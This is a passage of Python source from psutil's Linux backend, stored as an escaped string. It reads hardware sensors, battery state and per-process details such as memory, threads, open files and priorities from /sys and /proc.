lm-sensors on Ubuntu 16.04 relies on /sys/class/hwmon\n    - /sys/class/thermal/thermal_zone* is another one but it\'s more\n      difficult to parse\n    """\n    ret = collections.defaultdict(list)\n    basenames = glob.glob(\'/sys/class/hwmon/hwmon*/temp*_*\')\n    # CentOS has an intermediate /device directory:\n    # https://github.com/giampaolo/psutil/issues/971\n    # https://github.com/nicolargo/glances/issues/1060\n    basenames.extend(glob.glob(\'/sys/class/hwmon/hwmon*/device/temp*_*\'))\n    basenames = sorted(set([x.split(\'_\')[0] for x in basenames]))\n\n    # Only add the coretemp hwmon entries if they\'re not already in\n    # /sys/class/hwmon/\n    # https://github.com/giampaolo/psutil/issues/1708\n    # https://github.com/giampaolo/psutil/pull/1648\n    basenames2 = glob.glob(\n        \'/sys/devices/platform/coretemp.*/hwmon/hwmon*/temp*_*\')\n    repl = re.compile(\'/sys/devices/platform/coretemp.*/hwmon/\')\n    for name in basenames2:\n        altname = repl.sub(\'/sys/class/hwmon/\', name)\n        if altname not in basenames:\n            basenames.append(name)\n\n    for base in basenames:\n        try:\n            path = base + \'_input\'\n            current = float(bcat(path)) / 1000.0\n            path = os.path.join(os.path.dirname(base), \'name\')\n            unit_name = cat(path).strip()\n        except (IOError, OSError, ValueError):\n            # A lot of things can go wrong here, so let\'s just skip the\n            # whole entry. Sure thing is Linux\'s /sys/class/hwmon really\n            # is a stinky broken mess.\n            # https://github.com/giampaolo/psutil/issues/1009\n            # https://github.com/giampaolo/psutil/issues/1101\n            # https://github.com/giampaolo/psutil/issues/1129\n            # https://github.com/giampaolo/psutil/issues/1245\n            # https://github.com/giampaolo/psutil/issues/1323\n            continue\n\n        high = bcat(base + \'_max\', fallback=None)\n        critical = bcat(base + \'_crit\', fallback=None)\n        label = cat(base + \'_label\', fallback=\'\').strip()\n\n        if high is not None:\n            try:\n                high = float(high) / 1000.0\n            except ValueError:\n                high = None\n        if critical is not None:\n            try:\n                critical = float(critical) / 1000.0\n            except ValueError:\n                critical = None\n\n        ret[unit_name].append((label, current, high, critical))\n\n    # Indication that no sensors were detected in /sys/class/hwmon/\n    if not basenames:\n        basenames = glob.glob(\'/sys/class/thermal/thermal_zone*\')\n        basenames = sorted(set(basenames))\n\n        for base in basenames:\n            try:\n                path = os.path.join(base, \'temp\')\n                current = float(bcat(path)) / 1000.0\n                path = os.path.join(base, \'type\')\n                unit_name = cat(path).strip()\n            except (IOError, OSError, ValueError) as err:\n                debug(err)\n                continue\n\n            trip_paths = glob.glob(base + \'/trip_point*\')\n            trip_points = set([\'_\'.join(\n                os.path.basename(p).split(\'_\')[0:3]) for p in trip_paths])\n            critical = None\n            high = None\n            for trip_point in trip_points:\n                path = os.path.join(base, trip_point + "_type")\n                trip_type = cat(path, fallback=\'\').strip()\n                if trip_type == \'critical\':\n                    critical = bcat(os.path.join(base, trip_point + "_temp"),\n                                    fallback=None)\n                elif trip_type == \'high\':\n                    high = bcat(os.path.join(base, trip_point + "_temp"),\n                                fallback=None)\n\n                if high is not None:\n                    try:\n                        high = float(high) / 1000.0\n                    except ValueError:\n                        high = None\n                if critical is not None:\n                    try:\n                        critical = float(critical) / 1000.0\n                    except ValueError:\n                        critical = None\n\n            ret[unit_name].append((\'\', current, high, critical))\n\n    return dict(ret)\n\n\ndef sensors_fans():\n    """Return hardware fans info (for CPU and other peripherals) as a\n    dict including hardware label and current speed.\n\n    Implementation notes:\n    - /sys/class/hwmon looks like the most recent interface to\n      retrieve this info, and this implementation relies on it\n      only (old distros will probably use something else)\n    - lm-sensors on Ubuntu 16.04 relies on /sys/class/hwmon\n    """\n    ret = collections.defaultdict(list)\n    basenames = glob.glob(\'/sys/class/hwmon/hwmon*/fan*_*\')\n    if not basenames:\n        # CentOS has an intermediate /device directory:\n        # https://github.com/giampaolo/psutil/issues/971\n        basenames = glob.glob(\'/sys/class/hwmon/hwmon*/device/fan*_*\')\n\n    basenames = sorted(set([x.split(\'_\')[0] for x in basenames]))\n    for base in basenames:\n        try:\n            current = int(bcat(base + \'_input\'))\n        except (IOError, OSError) as err:\n            debug(err)\n            continue\n        unit_name = cat(os.path.join(os.path.dirname(base), \'name\')).strip()\n        label = cat(base + \'_label\', fallback=\'\').strip()\n        ret[unit_name].append(_common.sfan(label, current))\n\n    return dict(ret)\n\n\ndef sensors_battery():\n    """Return battery information.\n    Implementation note: it appears /sys/class/power_supply/BAT0/\n    directory structure may vary and provide files with the same\n    meaning but under different names, see:\n    https://github.com/giampaolo/psutil/issues/966\n    """\n    null = object()\n\n    def multi_bcat(*paths):\n        """Attempt to read the content of multiple files which may\n        not exist. If none of them exist return None.\n        """\n        for path in paths:\n            ret = bcat(path, fallback=null)\n            if ret != null:\n                try:\n                    return int(ret)\n                except ValueError:\n                    return ret.strip()\n        return None\n\n    bats = [x for x in os.listdir(POWER_SUPPLY_PATH) if x.startswith(\'BAT\') or\n            \'battery\' in x.lower()]\n    if not bats:\n        return None\n    # Get the first available battery. Usually this is "BAT0", except\n    # some rare exceptions:\n    # https://github.com/giampaolo/psutil/issues/1238\n    root = os.path.join(POWER_SUPPLY_PATH, sorted(bats)[0])\n\n    # Base metrics.\n    energy_now = multi_bcat(\n        root + "/energy_now",\n        root + "/charge_now")\n    power_now = multi_bcat(\n        root + "/power_now",\n        root + "/current_now")\n    energy_full = multi_bcat(\n        root + "/energy_full",\n        root + "/charge_full")\n    time_to_empty = multi_bcat(root + "/time_to_empty_now")\n\n    # Percent. If we have energy_full the percentage will be more\n    # accurate compared to reading /capacity file (float vs. int).\n    if energy_full is not None and energy_now is not None:\n        try:\n            percent = 100.0 * energy_now / energy_full\n        except ZeroDivisionError:\n            percent = 0.0\n    else:\n        percent = int(cat(root + "/capacity", fallback=-1))\n        if percent == -1:\n            return None\n\n    # Is AC power cable plugged in?\n    # Note: AC0 is not always available and sometimes (e.g. CentOS7)\n    # it\'s called "AC".\n    power_plugged = None\n    online = multi_bcat(\n        os.path.join(POWER_SUPPLY_PATH, "AC0/online"),\n        os.path.join(POWER_SUPPLY_PATH, "AC/online"))\n    if online is not None:\n        power_plugged = online == 1\n    else:\n        status = cat(root + "/status", fallback="").strip().lower()\n        if status == "discharging":\n            power_plugged = False\n        elif status in ("charging", "full"):\n            power_plugged = True\n\n    # Seconds left.\n    # Note to self: we may also calculate the charging ETA as per:\n    # https://github.com/thialfihar/dotfiles/blob/\n    #     013937745fd9050c30146290e8f963d65c0179e6/bin/battery.py#L55\n    if power_plugged:\n        secsleft = _common.POWER_TIME_UNLIMITED\n    elif energy_now is not None and power_now is not None:\n        try:\n            secsleft = int(energy_now / power_now * 3600)\n        except ZeroDivisionError:\n            secsleft = _common.POWER_TIME_UNKNOWN\n    elif time_to_empty is not None:\n        secsleft = int(time_to_empty * 60)\n        if secsleft < 0:\n            secsleft = _common.POWER_TIME_UNKNOWN\n    else:\n        secsleft = _common.POWER_TIME_UNKNOWN\n\n    return _common.sbattery(percent, secsleft, power_plugged)\n\n\n# =====================================================================\n# --- other system functions\n# =====================================================================\n\n\ndef users():\n    """Return currently connected users as a list of namedtuples."""\n    retlist = []\n    rawlist = cext.users()\n    for item in rawlist:\n        user, tty, hostname, tstamp, user_process, pid = item\n        # note: the underlying C function includes entries about\n        # system boot, run level and others.  We might want\n        # to use them in the future.\n        if not user_process:\n            continue\n        if hostname in (\':0.0\', \':0\'):\n            hostname = \'localhost\'\n        nt = _common.suser(user, tty or None, hostname, tstamp, pid)\n        retlist.append(nt)\n    return retlist\n\n\ndef boot_time():\n    """Return the system boot time expressed in seconds since the epoch."""\n    global BOOT_TIME\n    path = \'%s/stat\' % get_procfs_path()\n    with open_binary(path) as f:\n        for line in f:\n            if line.startswith(b\'btime\'):\n                ret = float(line.strip().split()[1])\n                BOOT_TIME = ret\n                return ret\n        raise RuntimeError(\n            "line \'btime\' not found in %s" % path)\n\n\n# =====================================================================\n# --- processes\n# =====================================================================\n\n\ndef pids():\n    """Returns a list of PIDs currently running on the system."""\n    return [int(x) for x in os.listdir(b(get_procfs_path())) if x.isdigit()]\n\n\ndef pid_exists(pid):\n    """Check for the existence of a unix PID. Linux TIDs are not\n    supported (always return False).\n    """\n    if not _psposix.pid_exists(pid):\n        return False\n    else:\n        # Linux\'s apparently does not distinguish between PIDs and TIDs\n        # (thread IDs).\n        # listdir("/proc") won\'t show any TID (only PIDs) but\n        # os.stat("/proc/{tid}") will succeed if {tid} exists.\n        # os.kill() can also be passed a TID. This is quite confusing.\n        # In here we want to enforce this distinction and support PIDs\n        # only, see:\n        # https://github.com/giampaolo/psutil/issues/687\n        try:\n            # Note: already checked that this is faster than using a\n            # regular expr. Also (a lot) faster than doing\n            # \'return pid in pids()\'\n            path = "%s/%s/status" % (get_procfs_path(), pid)\n            with open_binary(path) as f:\n                for line in f:\n                    if line.startswith(b"Tgid:"):\n                        tgid = int(line.split()[1])\n                        # If tgid and pid are the same then we\'re\n                        # dealing with a process PID.\n                        return tgid == pid\n                raise ValueError("\'Tgid\' line not found in %s" % path)\n        except (EnvironmentError, ValueError):\n            return pid in pids()\n\n\ndef ppid_map():\n    """Obtain a {pid: ppid, ...} dict for all running processes in\n    one shot. Used to speed up Process.children().\n    """\n    ret = {}\n    procfs_path = get_procfs_path()\n    for pid in pids():\n        try:\n            with open_binary("%s/%s/stat" % (procfs_path, pid)) as f:\n                data = f.read()\n        except (FileNotFoundError, ProcessLookupError):\n            # Note: we should be able to access /stat for all processes\n            # aka it\'s unlikely we\'ll bump into EPERM, which is good.\n            pass\n        else:\n            rpar = data.rfind(b\')\')\n            dset = data[rpar + 2:].split()\n            ppid = int(dset[1])\n            ret[pid] = ppid\n    return ret\n\n\ndef wrap_exceptions(fun):\n    """Decorator which translates bare OSError and IOError exceptions\n    into NoSuchProcess and AccessDenied.\n    """\n    @functools.wraps(fun)\n    def wrapper(self, *args, **kwargs):\n        try:\n            return fun(self, *args, **kwargs)\n        except PermissionError:\n            raise AccessDenied(self.pid, self._name)\n        except ProcessLookupError:\n            raise NoSuchProcess(self.pid, self._name)\n        except FileNotFoundError:\n            if not os.path.exists("%s/%s" % (self._procfs_path, self.pid)):\n                raise NoSuchProcess(self.pid, self._name)\n            # Note: zombies will keep existing under /proc until they\'re\n            # gone so there\'s no way to distinguish them in here.\n            raise\n    return wrapper\n\n\nclass Process(object):\n    """Linux process implementation."""\n\n    __slots__ = ["pid", "_name", "_ppid", "_procfs_path", "_cache"]\n\n    def __init__(self, pid):\n        self.pid = pid\n        self._name = None\n        self._ppid = None\n        self._procfs_path = get_procfs_path()\n\n    def _assert_alive(self):\n        """Raise NSP if the process disappeared on us."""\n        # For those C function who do not raise NSP, possibly returning\n        # incorrect or incomplete result.\n        os.stat(\'%s/%s\' % (self._procfs_path, self.pid))\n\n    @wrap_exceptions\n    @memoize_when_activated\n    def _parse_stat_file(self):\n        """Parse /proc/{pid}/stat file and return a dict with various\n        process info.\n        Using "man proc" as a reference: where "man proc" refers to\n        position N always subtract 3 (e.g ppid position 4 in\n        \'man proc\' == position 1 in here).\n        The return value is cached in case oneshot() ctx manager is\n        in use.\n        """\n        data = bcat("%s/%s/stat" % (self._procfs_path, self.pid))\n        # Process name is between parentheses. It can contain spaces and\n        # other parentheses. This is taken into account by looking for\n        # the first occurrence of "(" and the last occurence of ")".\n        rpar = data.rfind(b\')\')\n        name = data[data.find(b\'(\') + 1:rpar]\n        fields = data[rpar + 2:].split()\n\n        ret = {}\n        ret[\'name\'] = name\n        ret[\'status\'] = fields[0]\n        ret[\'ppid\'] = fields[1]\n        ret[\'ttynr\'] = fields[4]\n        ret[\'utime\'] = fields[11]\n        ret[\'stime\'] = fields[12]\n        ret[\'children_utime\'] = fields[13]\n        ret[\'children_stime\'] = fields[14]\n        ret[\'create_time\'] = fields[19]\n        ret[\'cpu_num\'] = fields[36]\n        ret[\'blkio_ticks\'] = fields[39]  # aka \'delayacct_blkio_ticks\'\n\n        return ret\n\n    @wrap_exceptions\n    @memoize_when_activated\n    def _read_status_file(self):\n        """Read /proc/{pid}/stat file and return its content.\n        The return value is cached in case oneshot() ctx manager is\n        in use.\n        """\n        with open_binary("%s/%s/status" % (self._procfs_path, self.pid)) as f:\n            return f.read()\n\n    @wrap_exceptions\n    @memoize_when_activated\n    def _read_smaps_file(self):\n        with open_binary("%s/%s/smaps" % (self._procfs_path, self.pid)) as f:\n            return f.read().strip()\n\n    def oneshot_enter(self):\n        self._parse_stat_file.cache_activate(self)\n        self._read_status_file.cache_activate(self)\n        self._read_smaps_file.cache_activate(self)\n\n    def oneshot_exit(self):\n        self._parse_stat_file.cache_deactivate(self)\n        self._read_status_file.cache_deactivate(self)\n        self._read_smaps_file.cache_deactivate(self)\n\n    @wrap_exceptions\n    def name(self):\n        name = self._parse_stat_file()[\'name\']\n        if PY3:\n            name = decode(name)\n        # XXX - gets changed later and probably needs refactoring\n        return name\n\n    def exe(self):\n        try:\n            return readlink("%s/%s/exe" % (self._procfs_path, self.pid))\n        except (FileNotFoundError, ProcessLookupError):\n            # no such file error; might be raised also if the\n            # path actually exists for system processes with\n            # low pids (about 0-20)\n            if os.path.lexists("%s/%s" % (self._procfs_path, self.pid)):\n                return ""\n            else:\n                if not pid_exists(self.pid):\n                    raise NoSuchProcess(self.pid, self._name)\n                else:\n                    raise ZombieProcess(self.pid, self._name, self._ppid)\n        except PermissionError:\n            raise AccessDenied(self.pid, self._name)\n\n    @wrap_exceptions\n    def cmdline(self):\n        with open_text("%s/%s/cmdline" % (self._procfs_path, self.pid)) as f:\n            data = f.read()\n        if not data:\n            # may happen in case of zombie process\n            return []\n        # \'man proc\' states that args are separated by null bytes \'\\0\'\n        # and last char is supposed to be a null byte. Nevertheless\n        # some processes may change their cmdline after being started\n        # (via setproctitle() or similar), they are usually not\n        # compliant with this rule and use spaces instead. Google\n        # Chrome process is an example. See:\n        # https://github.com/giampaolo/psutil/issues/1179\n        sep = \'\\x00\' if data.endswith(\'\\x00\') else \' \'\n        if data.endswith(sep):\n            data = data[:-1]\n        cmdline = data.split(sep)\n        # Sometimes last char is a null byte \'\\0\' but the args are\n        # separated by spaces, see: https://github.com/giampaolo/psutil/\n        # issues/1179#issuecomment-552984549\n        if sep == \'\\x00\' and len(cmdline) == 1 and \' \' in data:\n            cmdline = data.split(\' \')\n        return cmdline\n\n    @wrap_exceptions\n    def environ(self):\n        with open_text("%s/%s/environ" % (self._procfs_path, self.pid)) as f:\n            data = f.read()\n        return parse_environ_block(data)\n\n    @wrap_exceptions\n    def terminal(self):\n        tty_nr = int(self._parse_stat_file()[\'ttynr\'])\n        tmap = _psposix.get_terminal_map()\n        try:\n            return tmap[tty_nr]\n        except KeyError:\n            return None\n\n    # May not be available on old kernels.\n    if os.path.exists(\'/proc/%s/io\' % os.getpid()):\n        @wrap_exceptions\n        def io_counters(self):\n            fname = "%s/%s/io" % (self._procfs_path, self.pid)\n            fields = {}\n            with open_binary(fname) as f:\n                for line in f:\n                    # https://github.com/giampaolo/psutil/issues/1004\n                    line = line.strip()\n                    if line:\n                        try:\n                            name, value = line.split(b\': \')\n                        except ValueError:\n                            # https://github.com/giampaolo/psutil/issues/1004\n                            continue\n                        else:\n                            fields[name] = int(value)\n            if not fields:\n                raise RuntimeError("%s file was empty" % fname)\n            try:\n                return pio(\n                    fields[b\'syscr\'],  # read syscalls\n                    fields[b\'syscw\'],  # write syscalls\n                    fields[b\'read_bytes\'],  # read bytes\n                    fields[b\'write_bytes\'],  # write bytes\n                    fields[b\'rchar\'],  # read chars\n                    fields[b\'wchar\'],  # write chars\n                )\n            except KeyError as err:\n                raise ValueError("%r field was not found in %s; found fields "\n                                 "are %r" % (err[0], fname, fields))\n\n    @wrap_exceptions\n    def cpu_times(self):\n        values = self._parse_stat_file()\n        utime = float(values[\'utime\']) / CLOCK_TICKS\n        stime = float(values[\'stime\']) / CLOCK_TICKS\n        children_utime = float(values[\'children_utime\']) / CLOCK_TICKS\n        children_stime = float(values[\'children_stime\']) / CLOCK_TICKS\n        iowait = float(values[\'blkio_ticks\']) / CLOCK_TICKS\n        return pcputimes(utime, stime, children_utime, children_stime, iowait)\n\n    @wrap_exceptions\n    def cpu_num(self):\n        """What CPU the process is on."""\n        return int(self._parse_stat_file()[\'cpu_num\'])\n\n    @wrap_exceptions\n    def wait(self, timeout=None):\n        return _psposix.wait_pid(self.pid, timeout, self._name)\n\n    @wrap_exceptions\n    def create_time(self):\n        ctime = float(self._parse_stat_file()[\'create_time\'])\n        # According to documentation, starttime is in field 21 and the\n        # unit is jiffies (clock ticks).\n        # We first divide it for clock ticks and then add uptime returning\n        # seconds since the epoch.\n        # Also use cached value if available.\n        bt = BOOT_TIME or boot_time()\n        return (ctime / CLOCK_TICKS) + bt\n\n    @wrap_exceptions\n    def memory_info(self):\n        #  ============================================================\n        # | FIELD  | DESCRIPTION                         | AKA  | TOP  |\n        #  ============================================================\n        # | rss    | resident set size                   |      | RES  |\n        # | vms    | total program size                  | size | VIRT |\n        # | shared | shared pages (from shared mappings) |      | SHR  |\n        # | text   | text (\'code\')                       | trs  | CODE |\n        # | lib    | library (unused in Linux 2.6)       | lrs  |      |\n        # | data   | data + stack                        | drs  | DATA |\n        # | dirty  | dirty pages (unused in Linux 2.6)   | dt   |      |\n        #  ============================================================\n        with open_binary("%s/%s/statm" % (self._procfs_path, self.pid)) as f:\n            vms, rss, shared, text, lib, data, dirty = \\\n                [int(x) * PAGESIZE for x in f.readline().split()[:7]]\n        return pmem(rss, vms, shared, text, lib, data, dirty)\n\n    if HAS_PROC_SMAPS_ROLLUP or HAS_PROC_SMAPS:\n\n        @wrap_exceptions\n        def _parse_smaps_rollup(self):\n            # /proc/pid/smaps_rollup was added to Linux in 2017. Faster\n            # than /proc/pid/smaps. It reports higher PSS than */smaps\n            # (from 1k up to 200k higher; tested against all processes).\n            uss = pss = swap = 0\n            try:\n                with open_binary("{}/{}/smaps_rollup".format(\n                        self._procfs_path, self.pid)) as f:\n                    for line in f:\n                        if line.startswith(b"Private_"):\n                            # Private_Clean, Private_Dirty, Private_Hugetlb\n                            uss += int(line.split()[1]) * 1024\n                        elif line.startswith(b"Pss:"):\n                            pss = int(line.split()[1]) * 1024\n                        elif line.startswith(b"Swap:"):\n                            swap = int(line.split()[1]) * 1024\n            except ProcessLookupError:  # happens on readline()\n                if not pid_exists(self.pid):\n                    raise NoSuchProcess(self.pid, self._name)\n                else:\n                    raise ZombieProcess(self.pid, self._name, self._ppid)\n            return (uss, pss, swap)\n\n        @wrap_exceptions\n        def _parse_smaps(\n                self,\n                # Gets Private_Clean, Private_Dirty, Private_Hugetlb.\n                _private_re=re.compile(br"\\nPrivate.*:\\s+(\\d+)"),\n                _pss_re=re.compile(br"\\nPss\\:\\s+(\\d+)"),\n                _swap_re=re.compile(br"\\nSwap\\:\\s+(\\d+)")):\n            # /proc/pid/smaps does not exist on kernels < 2.6.14 or if\n            # CONFIG_MMU kernel configuration option is not enabled.\n\n            # Note: using 3 regexes is faster than reading the file\n            # line by line.\n            # XXX: on Python 3 the 2 regexes are 30% slower than on\n            # Python 2 though. Figure out why.\n            #\n            # You might be tempted to calculate USS by subtracting\n            # the "shared" value from the "resident" value in\n            # /proc/<pid>/statm. But at least on Linux, statm\'s "shared"\n            # value actually counts pages backed by files, which has\n            # little to do with whether the pages are actually shared.\n            # /proc/self/smaps on the other hand appears to give us the\n            # correct information.\n            smaps_data = self._read_smaps_file()\n            # Note: smaps file can be empty for certain processes.\n            # The code below will not crash though and will result to 0.\n            uss = sum(map(int, _private_re.findall(smaps_data))) * 1024\n            pss = sum(map(int, _pss_re.findall(smaps_data))) * 1024\n            swap = sum(map(int, _swap_re.findall(smaps_data))) * 1024\n            return (uss, pss, swap)\n\n        def memory_full_info(self):\n            if HAS_PROC_SMAPS_ROLLUP:  # faster\n                uss, pss, swap = self._parse_smaps_rollup()\n            else:\n                uss, pss, swap = self._parse_smaps()\n            basic_mem = self.memory_info()\n            return pfullmem(*basic_mem + (uss, pss, swap))\n\n    else:\n        memory_full_info = memory_info\n\n    if HAS_PROC_SMAPS:\n\n        @wrap_exceptions\n        def memory_maps(self):\n            """Return process\'s mapped memory regions as a list of named\n            tuples. Fields are explained in \'man proc\'; here is an updated\n            (Apr 2012) version: http://goo.gl/fmebo\n\n            /proc/{PID}/smaps does not exist on kernels < 2.6.14 or if\n            CONFIG_MMU kernel configuration option is not enabled.\n            """\n            def get_blocks(lines, current_block):\n                data = {}\n                for line in lines:\n                    fields = line.split(None, 5)\n                    if not fields[0].endswith(b\':\'):\n                        # new block section\n                        yield (current_block.pop(), data)\n                        current_block.append(line)\n                    else:\n                        try:\n                            data[fields[0]] = int(fields[1]) * 1024\n                        except ValueError:\n                            if fields[0].startswith(b\'VmFlags:\'):\n                                # see issue #369\n                                continue\n                            else:\n                                raise ValueError("don\'t know how to inte"\n                                                 "rpret line %r" % line)\n                yield (current_block.pop(), data)\n\n            data = self._read_smaps_file()\n            # Note: smaps file can be empty for certain processes.\n            if not data:\n                return []\n            lines = data.split(b\'\\n\')\n            ls = []\n            first_line = lines.pop(0)\n            current_block = [first_line]\n            for header, data in get_blocks(lines, current_block):\n                hfields = header.split(None, 5)\n                try:\n                    addr, perms, offset, dev, inode, path = hfields\n                except ValueError:\n                    addr, perms, offset, dev, inode, path = \\\n                        hfields + [\'\']\n                if not path:\n                    path = \'[anon]\'\n                else:\n                    if PY3:\n                        path = decode(path)\n                    path = path.strip()\n                    if (path.endswith(\' (deleted)\') and not\n                            path_exists_strict(path)):\n                        path = path[:-10]\n                ls.append((\n                    decode(addr), decode(perms), path,\n                    data.get(b\'Rss:\', 0),\n                    data.get(b\'Size:\', 0),\n                    data.get(b\'Pss:\', 0),\n                    data.get(b\'Shared_Clean:\', 0),\n                    data.get(b\'Shared_Dirty:\', 0),\n                    data.get(b\'Private_Clean:\', 0),\n                    data.get(b\'Private_Dirty:\', 0),\n                    data.get(b\'Referenced:\', 0),\n                    data.get(b\'Anonymous:\', 0),\n                    data.get(b\'Swap:\', 0)\n                ))\n            return ls\n\n    @wrap_exceptions\n    def cwd(self):\n        try:\n            return readlink("%s/%s/cwd" % (self._procfs_path, self.pid))\n        except (FileNotFoundError, ProcessLookupError):\n            # https://github.com/giampaolo/psutil/issues/986\n            if not pid_exists(self.pid):\n                raise NoSuchProcess(self.pid, self._name)\n            else:\n                raise ZombieProcess(self.pid, self._name, self._ppid)\n\n    @wrap_exceptions\n    def num_ctx_switches(self,\n                         _ctxsw_re=re.compile(br\'ctxt_switches:\\t(\\d+)\')):\n        data = self._read_status_file()\n        ctxsw = _ctxsw_re.findall(data)\n        if not ctxsw:\n            raise NotImplementedError(\n                "\'voluntary_ctxt_switches\' and \'nonvoluntary_ctxt_switches\'"\n                "lines were not found in %s/%s/status; the kernel is "\n                "probably older than 2.6.23" % (\n                    self._procfs_path, self.pid))\n        else:\n            return _common.pctxsw(int(ctxsw[0]), int(ctxsw[1]))\n\n    @wrap_exceptions\n    def num_threads(self, _num_threads_re=re.compile(br\'Threads:\\t(\\d+)\')):\n        # Note: on Python 3 using a re is faster than iterating over file\n        # line by line. On Python 2 is the exact opposite, and iterating\n        # over a file on Python 3 is slower than on Python 2.\n        data = self._read_status_file()\n        return int(_num_threads_re.findall(data)[0])\n\n    @wrap_exceptions\n    def threads(self):\n        thread_ids = os.listdir("%s/%s/task" % (self._procfs_path, self.pid))\n        thread_ids.sort()\n        retlist = []\n        hit_enoent = False\n        for thread_id in thread_ids:\n            fname = "%s/%s/task/%s/stat" % (\n                self._procfs_path, self.pid, thread_id)\n            try:\n                with open_binary(fname) as f:\n                    st = f.read().strip()\n            except FileNotFoundError:\n                # no such file or directory; it means thread\n                # disappeared on us\n                hit_enoent = True\n                continue\n            # ignore the first two values ("pid (exe)")\n            st = st[st.find(b\')\') + 2:]\n            values = st.split(b\' \')\n            utime = float(values[11]) / CLOCK_TICKS\n            stime = float(values[12]) / CLOCK_TICKS\n            ntuple = _common.pthread(int(thread_id), utime, stime)\n            retlist.append(ntuple)\n        if hit_enoent:\n            self._assert_alive()\n        return retlist\n\n    @wrap_exceptions\n    def nice_get(self):\n        # with open_text(\'%s/%s/stat\' % (self._procfs_path, self.pid)) as f:\n        #   data = f.read()\n        #   return int(data.split()[18])\n\n        # Use C implementation\n        return cext_posix.getpriority(self.pid)\n\n    @wrap_exceptions\n    def nice_set(self, value):\n        return cext_posix.setpriority(self.pid, value)\n\n    # starting from CentOS 6.\n    if HAS_CPU_AFFINITY:\n\n        @wrap_exceptions\n        def cpu_affinity_get(self):\n            return cext.proc_cpu_affinity_get(self.pid)\n\n        def _get_eligible_cpus(\n                self, _re=re.compile(br"Cpus_allowed_list:\\t(\\d+)-(\\d+)")):\n            # See: https://github.com/giampaolo/psutil/issues/956\n            data = self._read_status_file()\n            match = _re.findall(data)\n            if match:\n                return list(range(int(match[0][0]), int(match[0][1]) + 1))\n            else:\n                return list(range(len(per_cpu_times())))\n\n        @wrap_exceptions\n        def cpu_affinity_set(self, cpus):\n            try:\n                cext.proc_cpu_affinity_set(self.pid, cpus)\n            except (OSError, ValueError) as err:\n                if isinstance(err, ValueError) or err.errno == errno.EINVAL:\n                    eligible_cpus = self._get_eligible_cpus()\n                    all_cpus = tuple(range(len(per_cpu_times())))\n                    for cpu in cpus:\n                        if cpu not in all_cpus:\n                            raise ValueError(\n                                "invalid CPU number %r; choose between %s" % (\n                                    cpu, eligible_cpus))\n                        if cpu not in eligible_cpus:\n                            raise ValueError(\n                                "CPU number %r is not eligible; choose "\n                                "between %s" % (cpu, eligible_cpus))\n                raise\n\n    # only starting from kernel 2.6.13\n    if HAS_PROC_IO_PRIORITY:\n\n        @wrap_exceptions\n        def ionice_get(self):\n            ioclass, value = cext.proc_ioprio_get(self.pid)\n            if enum is not None:\n                ioclass = IOPriority(ioclass)\n            return _common.pionice(ioclass, value)\n\n        @wrap_exceptions\n        def ionice_set(self, ioclass, value):\n            if value is None:\n                value = 0\n            if value and ioclass in (IOPRIO_CLASS_IDLE, IOPRIO_CLASS_NONE):\n                raise ValueError("%r ioclass accepts no value" % ioclass)\n            if value < 0 or value > 7:\n                raise ValueError("value not in 0-7 range")\n            return cext.proc_ioprio_set(self.pid, ioclass, value)\n\n    if prlimit is not None:\n\n        @wrap_exceptions\n        def rlimit(self, resource_, limits=None):\n            # If pid is 0 prlimit() applies to the calling process and\n            # we don\'t want that. We should never get here though as\n            # PID 0 is not supported on Linux.\n            if self.pid == 0:\n                raise ValueError("can\'t use prlimit() against PID 0 process")\n            try:\n                if limits is None:\n                    # get\n                    return prlimit(self.pid, resource_)\n                else:\n                    # set\n                    if len(limits) != 2:\n                        raise ValueError(\n                            "second argument must be a (soft, hard) tuple, "\n                            "got %s" % repr(limits))\n                    prlimit(self.pid, resource_, limits)\n            except OSError as err:\n                if err.errno == errno.ENOSYS and pid_exists(self.pid):\n                    # I saw this happening on Travis:\n                    # https://travis-ci.org/giampaolo/psutil/jobs/51368273\n                    raise ZombieProcess(self.pid, self._name, self._ppid)\n                else:\n                    raise\n\n    @wrap_exceptions\n    def status(self):\n        letter = self._parse_stat_file()[\'status\']\n        if PY3:\n            letter = letter.decode()\n        # XXX is \'?\' legit? (we\'re not supposed to return it anyway)\n        return PROC_STATUSES.get(letter, \'?\')\n\n    @wrap_exceptions\n    def open_files(self):\n        retlist = []\n        files = os.listdir("%s/%s/fd" % (self._procfs_path, self.pid))\n        hit_enoent = False\n        for fd in files:\n            file = "%s/%s/fd/%s" % (self._procfs_path, self.pid, fd)\n            try:\n                path = readlink(file)\n            except (FileNotFoundError, ProcessLookupError):\n                # ENOENT == file which is gone in the meantime\n                hit_enoent = True\n                continue\n            except OSError as err:\n                if err.errno == errno.EINVAL:\n                    # not a link\n                    continue\n                if err.errno == errno.ENAMETOOLONG:\n                    # file name too long\n                    debug(err)\n                    continue\n                raise\n            else:\n                # If path is not an absolute there\'s no way to tell\n                # whether it\'s a regular file or not, so we skip it.\n                # A regular file is always supposed to be have an\n                # absolute path though.\n                if path.startswith(\'/\') and isfile_strict(path):\n                    # Get file position and flags.\n                    file = "%s/%s/fdinfo/%s" % (\n                        self._procfs_path, self.pid, fd)\n                    try:\n                        with open_binary(file) as f:\n                            pos = int(f.readline().split()[1])\n                            flags = int(f.readline().split()[1], 8)\n                    except FileNotFoundError:\n                        # fd gone in the meantime; process may\n                        # still be alive\n                        hit_enoent = True\n                    else:\n                        mode = file_flags_to_mode(flags)\n                        ntuple = popenfile(\n                            path, int(fd), int(pos), mode, flags)\n                        retlist.append(ntuple)\n        if hit_enoent:\n            self._assert_alive()\n        return retlist\n\n    @wrap_exceptions\n    def connections(self, kind=\'inet\'):\n        ret = _connections.retrieve(kind, self.pid)\n        self._assert_alive()\n        return ret\n\n    @wrap_exceptions\n    def num_fds(self):\n        return len(os.listdir("%s/%s/fd" % (self._procfs_path, self.pid)))\n\n    @wrap_exceptions\n    def ppid(self):\n        return int(self._parse_stat_file()[\'ppid\'])\n\n    @wrap_exceptions\n    def uids(self, _uids_re=re.compile(br\'Uid:\\t(\\d+)\\t(\\d+)\\t(\\d+)\')):\n        data = self._read_status_file()\n        real, effective, saved = _uids_re.findall(data)[0]\n        return _common.puids(int(real), int(effective), int(saved))\n\n    @wrap_exceptions\n    def gids(self, _gids_re=re.compile(br\'Gid:\\t(\\d+)\\t(\\d+)\\t(\\d+)\')):\n        data = self._read_status_file()\n        real, effective, saved = _gids_re.findall(data)[0]\n        return _common.pgids(int(real), int(effective), int(saved))\n')
